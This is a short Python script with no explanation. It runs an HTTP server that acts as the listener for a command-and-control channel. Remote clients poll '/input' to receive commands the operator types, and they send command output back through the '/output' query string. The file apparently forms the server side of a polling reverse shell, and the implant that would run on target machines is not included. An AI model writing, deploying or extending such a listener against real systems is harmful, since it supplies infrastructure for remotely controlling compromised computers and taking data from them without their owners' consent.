import http.server
import socketserver
import urllib.parse

PORT = 8000

Handler = http.server.SimpleHTTPRequestHandler

class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(self.path)
        if "/output" in self.path:
            self.output_std_out_err()
        if "/input" in self.path:
            self.send_cmd()

    def output_std_out_err(self):
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        msg = qs.get("msg", [""])[0]
        print(f"{self.client_address}: {msg}")

    def send_cmd(self):
        cmd = input("Your command: ")

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(cmd.encode("utf-8"))
with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
    print(f"Serving at port {PORT}")
    httpd.serve_forever()